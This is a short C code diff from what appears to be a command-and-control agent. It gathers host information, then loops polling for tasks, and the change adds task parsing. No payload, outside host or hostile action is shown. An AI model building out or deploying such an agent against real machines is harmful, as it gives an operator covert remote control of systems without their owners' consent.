@@ -9,8 +9,9 @@
 
 int main(void)
 {
-    struct strings_array sa = { NULL, NULL, 0, 1, 0, NULL};
+    struct strings_array sa = { NULL, NULL, 0};
     struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}};
+    struct tasks task = { 0, 0, {'\0'}, NULL, 0, 1};
  
     bool host_info_gathered = false;
     while(!host_info_gathered) {
@@ -47,11 +48,14 @@ int main(void)
 
     while(true) {
         puts("Checking tasks\n");
-        // Check tasks will eventually return an array of strings.
-        // The number of elements in that array will dictate how.
-        // Many tasks there were and how many times execute_tasks
-        // will be called.
         check_tasks(&agent, &sa);
+        parse_tasks(sa.response, &task);
+
+        // char line[1024] = { '\0' };
+        // while (fgets(line, sizeof(line), sa.response) != NULL) {
+        //     sscanf(line, "%d %d %s", task.id, task.type, task.arg);
+        // }
+
 
         // Eventually check_tasks will return the task type and
         // specific task. An if block will be added here to
